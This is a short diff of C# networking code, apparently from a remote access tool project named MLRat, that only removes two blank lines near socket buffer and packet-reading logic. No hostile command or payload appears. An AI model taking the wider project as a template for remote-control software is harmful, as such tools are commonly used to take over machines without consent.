@@ -45,7 +45,6 @@ namespace MLRat.Networking
 
             private Socket _globalSocket;
             private int _BufferSize = 1000000;
-
             public int BufferSize
             {
                 get
@@ -195,7 +194,6 @@ namespace MLRat.Networking
                         while (bufferStream.Position < bufferStream.Length)
                         {
                             int length = packetReader.ReadInt32();
-
                             if (length > bufferStream.Length - bufferStream.Position)
                             {
                                 using (MemoryStream recievePacketChunks = new MemoryStream(length))
